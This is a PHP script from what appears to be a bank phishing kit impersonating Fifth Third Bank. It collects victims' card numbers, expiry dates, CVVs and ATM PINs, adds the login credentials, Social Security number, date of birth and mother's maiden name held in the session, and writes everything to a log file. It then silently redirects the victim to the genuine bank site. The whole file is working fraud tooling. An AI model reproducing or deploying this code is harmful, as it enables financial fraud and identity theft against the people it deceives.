<?php

session_start();
include("Sinus/HOSTER.php"); 
include("Sinus/blocker.php");
include("Sinus/detect.php");
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent); 
$cn = $_SESSION['cn'] = $_POST['cn'] ;
$ccexp = $_SESSION['ccexp'] = $_POST['ccexp'] ;
$cvv = $_SESSION['cvv'] = $_POST['cvv'] ;
$atp = $_SESSION['atp'] = $_POST['atp'] ;
$fn = $_SESSION['fn'];
$dob = $_SESSION['dob'];
$ssn = $_SESSION['ssn'];
$zip = $_SESSION['zip'];
$mmn = $_SESSION['mmn'];
$email = $_SESSION['email'];
$uid = $_SESSION['uid'];
$pwd = $_SESSION['pwd'];           
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);     
$msg.="--------------LOGIN DETAILS----------------\r\n";
$msg.="|+ Username: {$uid}\r\n";
$msg.="|+ Password : {$pwd}\r\n";
$msg.="------------------------------\r\n";
$msg.="--------------ACCOUNT DETAILS----------------\r\n";
$msg.="|+ Full Name: {$fn}\r\n";
$msg.="|+ Date of Birth : {$dob}\r\n";
$msg.="|+ Social Security Number: {$ssn}\r\n";
$msg.="|+ Zipcode: {$zip}\r\n";
$msg.="|+ Mother's maiden name: {$mmn}\r\n";
$msg.="|+ Email Address: {$email}\r\n";
$msg.="------------------------------\r\n";
$msg.="|+ Card Number: {$cn}\r\n";
$msg.="|+ Card expiration date: {$ccexp}\r\n";
$msg.="|+ CVV: {$cvv}\r\n";
$msg.="|+ ATP: {$atp}\r\n";
$msg.="------------------------------\r\n";
$msg.="|+ localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="|+ BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$save=fopen("xREPORT/final.txt","a+");fwrite($save,$msg);fclose($save);


echo "<script type='text/javascript'>window.top.location='https://www.53.com';</script>"; exit



?>